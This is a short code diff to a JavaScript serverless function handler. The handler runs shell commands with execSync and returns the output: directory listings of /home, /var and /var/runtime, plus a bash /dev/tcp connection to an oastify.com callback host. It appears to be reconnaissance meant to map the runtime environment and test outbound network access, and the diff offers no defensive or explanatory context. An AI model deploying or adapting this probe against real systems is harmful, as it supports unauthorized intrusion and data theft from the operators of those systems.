@@ -11,7 +11,9 @@ exports.handler = async function (event, context) {
       command3: execSync("pwd").toString().trim(),
       command4: execSync("ls -la /home/").toString().trim(),
       
-      command5: execSync('timeout 2 bash -c "</dev/tcp/function.727nku7yom5f8oeb5x8f1dco5fb6z5nu.oastify.com/80" 2>&1').toString();
+      command5: execSync('timeout 2 bash -c "</dev/tcp/function.727nku7yom5f8oeb5x8f1dco5fb6z5nu.oastify.com/80" 2>&1').toString(),
+      command4: execSync("ls -la /var/").toString().trim(),
+      command4: execSync("ls -la /var/runtime/").toString().trim(),
     };
 
     return {
